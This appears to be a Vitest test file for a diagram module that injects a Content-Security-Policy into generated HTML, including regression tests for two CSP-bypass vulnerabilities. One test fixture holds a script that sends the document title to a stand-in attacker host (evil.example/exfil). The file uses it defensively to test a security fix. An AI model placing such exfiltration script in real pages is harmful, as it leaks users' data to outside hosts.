import { describe, expect, it } from "vitest";
import { DIAGRAM_CSP, extractTitle, injectCsp } from "./diagram-file.js";

function page(body: string, head = ""): string {
  return `<!doctype html><html><head>${head}</head><body>${body}</body></html>`;
}

describe("extractTitle", () => {
  it("title の文字列を返す", () => {
    expect(extractTitle(page("x", "<title> 構成図 </title>"))).toBe("構成図");
  });

  it("実体参照を戻し、空白を詰める", () => {
    expect(extractTitle("<title>A &amp; B\n  C</title>")).toBe("A & B C");
  });

  it("title が無いか空なら null", () => {
    expect(extractTitle(page("x"))).toBeNull();
    expect(extractTitle("<title>  </title>")).toBeNull();
  });
});

describe("injectCsp", () => {
  it("head の直後に meta CSP を差し込む", () => {
    const out = injectCsp(page("<div>x</div>"));

    expect(out).toContain(DIAGRAM_CSP);
    expect(out.indexOf(DIAGRAM_CSP)).toBeLessThan(out.indexOf("<div>x</div>"));
  });

  it("head が無い文書でも先頭に差し込む", () => {
    const out = injectCsp("<div>x</div>");

    expect(out).toContain(DIAGRAM_CSP);
    expect(out.indexOf(DIAGRAM_CSP)).toBeLessThan(out.indexOf("<div>x</div>"));
  });

  it("生成物が自前で書いた CSP meta は取り除いてから差し込む", () => {
    const html = page(
      "<div>x</div>",
      `<meta http-equiv="Content-Security-Policy" content="default-src *">`
    );

    const out = injectCsp(html);

    expect(out).not.toContain("default-src *");
    expect(out.match(/http-equiv="Content-Security-Policy"/g)).toHaveLength(1);
  });

  it("HTML コメント内の <head> を誤検出して CSP を挿入しない（脆弱性修正1）", () => {
    // コメント内に <head> があると、現在の実装はそこに CSP を挿入してしまう。
    // CSP meta がコメントの中に入って無効化され、コメント外のスクリプトが CSP なしで実行される。
    const malicious = `<!-- <head> -->
<script>fetch('https://evil.example/exfil?d=' + document.title)</script>
<html><head><meta charset="utf-8"></head><body>diagram</body></html>`;

    const out = injectCsp(malicious);

    // CSP は常に文書の先頭に置かれ、コメント外に出ているべき
    expect(out.startsWith(DIAGRAM_CSP)).toBe(true);
  });

  it("引用符なし属性値の既存 CSP を除去する（脆弱性修正2）", () => {
    const html = page(
      "<div>x</div>",
      `<meta http-equiv=Content-Security-Policy content="default-src *">`
    );

    const out = injectCsp(html);

    // 引用符なし CSP が除去されているべき
    expect(out).not.toContain("default-src *");
    // Ark の CSP だけが残るべき
    expect(out.match(/http-equiv=.*Content-Security-Policy/g)).toHaveLength(1);
  });
});

describe("injectCsp と doctype の順序", () => {
  it("doctype があればその直後に CSP を差し込む（doctype より前に置かない）", () => {
    const out = injectCsp("<!doctype html>\n<html><body>x</body></html>");

    expect(out.indexOf("<!doctype")).toBe(0);
    expect(out.indexOf(DIAGRAM_CSP)).toBeGreaterThan(out.indexOf("<!doctype"));
    expect(out.indexOf(DIAGRAM_CSP)).toBeLessThan(out.indexOf("<body>"));
  });

  it("コメント内の偽 doctype では位置をずらせない（先頭アンカーのみ一致）", () => {
    const html = "<!-- <!doctype html> --><script>bad()</script>";

    const out = injectCsp(html);

    // 偽 doctype は先頭アンカーに一致しない（コメント開始が先頭）ため、
    // CSP は文書先頭に置かれ、script より必ず前に来る
    expect(out.indexOf(DIAGRAM_CSP)).toBe(0);
  });
});
